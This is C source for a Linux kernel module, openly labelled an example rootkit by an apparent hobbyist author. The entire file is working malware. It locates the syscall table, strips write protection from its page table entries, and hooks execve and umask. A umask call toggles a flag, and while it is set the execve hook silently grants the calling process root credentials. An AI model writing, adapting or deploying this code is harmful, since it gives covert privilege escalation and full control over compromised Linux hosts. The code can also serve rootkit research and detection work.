/* An example rootkit that gives root permissions to a userland process */

#include "asm/pgtable.h"
#include "linux/printk.h"
#include <asm/unistd.h>
#include <asm/cacheflush.h>
#include <asm/pgtable-types.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/hugetlb.h>

#define MA "@Pink_P4nther"
#define MD "Example Rootkit"
#define ML "GPL"
#define MV "1.1"

/* Enable root escalation flag */
int ref = 0;

/* Syscall table address */
void **sct_address;

/* Set sys_call_table address to sct_address */
void set_sct_addr(void);

/* Execve syscall hook */
asmlinkage int (*origin_execvecall)(const char *filename,
				    const char *const argv[],
				    const char *const envp[]);

/* Mal execve hook syscall */
asmlinkage int mal_execve(const char *filename, const char *const argv[],
			  const char *const envp[])
{
	if (ref == 1) {
		printk(KERN_INFO "[+] Giving r00t!");

		/* Create process cred struct */
		struct cred *np;
		/* Create uid struct */
		kuid_t nuid;
		/* Set uid struct value to 0 */
		nuid.val = 0;

		/* Prepares new set of credentials for task_struct of current process */
		np = prepare_creds();
		/* Set uid of new cred struct to 0 */
		np->uid = nuid;
		/* Set euid of new cred struct to 0 */
		np->euid = nuid;
		/* Commit cred to task_struct of process */
		commit_creds(np);
	}
	/* Call original execve syscall */
	return origin_execvecall(filename, argv, envp);
}

/* Umask syscall hook */
asmlinkage int (*origin_umaskcall)(mode_t mask);

/* Mal umask hook syscall */
asmlinkage int mal_umask(mode_t mask)
{
	if (ref == 0) {
		/* Set enable root escalation flag */
		ref = 1;
	} else {
		/* Unset enable root escalation flag */
		ref = 0;
	}
	/* Call original umask syscall */
	return origin_umaskcall(mask);
}

/* Set SCT Address */
void set_sct_addr(void)
{
	/* Lookup address for sys_call_table and set sct_address to it */
	sct_address = (void *)kallsyms_lookup_name("sys_call_table");
}

/* Make SCT writeable */
int sct_w(unsigned long sct_addr)
{
	uint64_t vaddr = sct_addr;
	pgd_t *pgd;
	p4d_t *p4d;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *ptep;

	pgd = pgd_offset_k(vaddr);
	if (pgd_none(*pgd) || pgd_bad(*pgd))
		return -1;

	p4d = p4d_offset(pgd, vaddr);

	if (p4d_none(*p4d) || p4d_bad(*p4d))
		return -1;

	pud = pud_offset(p4d, vaddr);

	if (pud_huge(*pud)) {
		// Make a 1GiB huge page writable
		set_pte((pte_t *)pud, pte_mkwrite_novma(*(pte_t *)pud));
		flush_tlb_kernel_range(vaddr, vaddr + PUD_SIZE);
		return 0;
	}
	if (pud_none(*pud) || pud_bad(*pud))
		return -1;

	pmd = pmd_offset(pud, vaddr);
	if (pmd_huge(*pmd)) {
		// Make a 2MiB huge page writable

		set_pte((pte_t *)pmd, pte_mkwrite_novma(*(pte_t *)pmd));
		flush_tlb_kernel_range(vaddr, vaddr + PMD_SIZE);
		return 0;
	}

	if (pmd_none(*pmd) || pmd_bad(*pmd))
		return -1;

	ptep = pte_offset_kernel(pmd, vaddr);
	if (pte_none(*ptep))
		return -1;

	// Modify the PTE to make the page writable
	set_pte(ptep, pte_mkwrite_novma(*ptep));
	flush_tlb_kernel_range(vaddr, vaddr + PAGE_SIZE);
	return 0;
}

/* Make SCT write protected */
int sct_xw(unsigned long sct_addr)
{
	uint64_t vaddr = sct_addr;
	pgd_t *pgd;
	p4d_t *p4d;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *ptep;

	pgd = pgd_offset_k(vaddr);
	if (pgd_none(*pgd) || pgd_bad(*pgd))
		return -1;

	p4d = p4d_offset(pgd, vaddr);

	if (p4d_none(*p4d) || p4d_bad(*p4d))
		return -1;

	pud = pud_offset(p4d, vaddr);

	if (pud_huge(*pud)) {
		// Make a 1GiB huge page RO 
		set_pte((pte_t *)pud, pte_wrprotect(*(pte_t *)pud));
		flush_tlb_kernel_range(vaddr, vaddr + PUD_SIZE);
		return 0;
	}
	if (pud_none(*pud) || pud_bad(*pud))
		return -1;

	pmd = pmd_offset(pud, vaddr);
	if (pmd_huge(*pmd)) {
		// Make a 2MiB huge page RO
		set_pte((pte_t *)pmd, pte_wrprotect(*(pte_t *)pmd));
		flush_tlb_kernel_range(vaddr, vaddr + PMD_SIZE);
		return 0;
	}

	if (pmd_none(*pmd) || pmd_bad(*pmd))
		return -1;

	ptep = pte_offset_kernel(pmd, vaddr);
	if (pte_none(*ptep))
		return -1;

	// Modify the PTE to make the page RO
	set_pte(ptep, pte_wrprotect(*ptep));
	flush_tlb_kernel_range(vaddr, vaddr + PAGE_SIZE);
	return 0;
}

/* Loads LKM */
static int __init hload(void)
{
	/* Set syscall table address */
	set_sct_addr();
	pr_info("Got sct_addr: 0x%llx\n", (unsigned long long)sct_address);
	/* Set pointer to original syscalls */
	origin_execvecall = sct_address[__NR_execve];
	origin_umaskcall = sct_address[__NR_umask];

	pr_info("Got execve: 0x%llx, Got umask: 0x%llx\n",
		(unsigned long long)origin_execvecall,
		(unsigned long long)origin_umaskcall);
	/* Make SCT writeable */
	sct_w((unsigned long)sct_address);

	pr_info("Set W!");
	/* Hook execve and umask syscalls */
	sct_address[__NR_execve] = mal_execve;
	sct_address[__NR_umask] = mal_umask;
	/* Set SCT write protected */
	sct_xw((unsigned long)sct_address);

	printk(KERN_INFO
	       "[?] SCT: [0x%llx]\n[?] EXECVE: [0x%llx]\n[?] UMASK: [0x%llx]",
	       sct_address, sct_address[__NR_execve], sct_address[__NR_umask]);

	return 0;
}

/* Unloads LKM */
static void __exit hunload(void)
{
	/* Rewrite the original syscall addresses back into the SCT page */
	sct_w((unsigned long)sct_address);
	sct_address[__NR_execve] = origin_execvecall;
	sct_address[__NR_umask] = origin_umaskcall;

	/* Make SCT page write protected */
	sct_xw((unsigned long)sct_address);
}

module_init(hload);
module_exit(hunload);

MODULE_LICENSE(ML);
MODULE_AUTHOR(MA);
MODULE_DESCRIPTION(MD);
MODULE_VERSION(MV);
